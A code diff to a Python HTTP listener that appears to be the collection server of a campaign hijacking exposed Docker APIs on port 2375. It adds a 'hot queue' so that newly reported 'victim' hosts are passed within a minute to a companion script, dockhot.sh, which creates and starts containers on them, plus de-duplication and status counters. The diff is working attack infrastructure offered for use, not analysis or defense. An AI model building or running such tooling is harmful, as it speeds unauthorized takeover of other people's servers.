@@ -27,9 +27,21 @@ MASS = os.path.join(HUNT, "mass.found")
 ALIVE = os.path.join(HUNT, "nest.alive")
 HITLOG = "/tmp/_nestd.hits"
 NOTELOG = "/tmp/_nestd.notes"
+# ---- hot queue ------------------------------------------------------------------
+# A hit is the freshest thing we own: a victim proved :2375 was open seconds ago,
+# while measured ~88% of the endpoints already sitting in mass.found are silent by
+# the time dock.sh walks to them. So every hit also lands in a small queue that
+# dockhot.sh drains every minute (create+start only), separate from the big sweep
+# queue. hot.tried holds ones that already failed, so a dead address does not
+# bounce between the two forever.
+HOT = os.path.join(HUNT, "hot.queue")
+HOTTRIED = os.path.join(HUNT, "hot.tried")
+HOT_MAX = 800
 
 lock = threading.Lock()
 known = set()
+hot_seen = set()
+hot_tried = set()
 TALLY = {"hits": 0, "fresh": 0, "notes": 0}
 
 
@@ -42,6 +54,43 @@ def load_known():
                     known.add(ip)
     except FileNotFoundError:
         pass
+    try:
+        with open(HOT, "r", errors="ignore") as fh:
+            for line in fh:
+                ip = line.split("\t")[0].strip()
+                if ip:
+                    hot_seen.add(ip)
+    except FileNotFoundError:
+        pass
+    try:
+        with open(HOTTRIED, "r", errors="ignore") as fh:
+            for line in fh.readlines()[-1500:]:
+                ip = line.split("\t")[0].strip()
+                if ip:
+                    hot_tried.add(ip)
+    except FileNotFoundError:
+        pass
+
+
+def queue_hot(ip):
+    """Queue a hit for the fast path, once, bounded."""
+    if ip in hot_seen or ip in hot_tried:
+        return
+    try:
+        with open(HOT, "a") as fh:
+            fh.write("%s\t%d\n" % (ip, int(time.time())))
+            fh.flush()
+        hot_seen.add(ip)
+    except OSError:
+        return
+    if len(hot_seen) > HOT_MAX:
+        # safety valve: dockhot normally drains us well before this
+        try:
+            lines = open(HOT, "r", errors="ignore").readlines()[-HOT_MAX // 2:]
+            with open(HOT, "w") as fh:
+                fh.writelines(lines)
+        except OSError:
+            pass
 
 
 class Handler(http.server.BaseHTTPRequestHandler):
@@ -68,6 +117,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 # logged, "1 hit" was indistinguishable from "the scanner is dead".
                 with open(HITLOG, "a") as fh:
                     fh.write("%s\t%s\t%s\t%s\n" % (time.strftime("%H:%M:%S"), ip, "fresh" if fresh else "dup", who))
+                queue_hot(ip)
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"ok" if fresh else b"dup")
@@ -98,7 +148,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
             self.end_headers()
-            self.wfile.write(("known=%d hits=%d fresh=%d notes=%d\n" % (len(known), TALLY["hits"], TALLY["fresh"], TALLY["notes"])).encode())
+            self.wfile.write(("known=%d hits=%d fresh=%d notes=%d hot=%d hot_tried=%d\n" % (len(known), TALLY["hits"], TALLY["fresh"], TALLY["notes"], len(hot_seen), len(hot_tried))).encode())
             return
         self.send_response(404)
         self.end_headers()
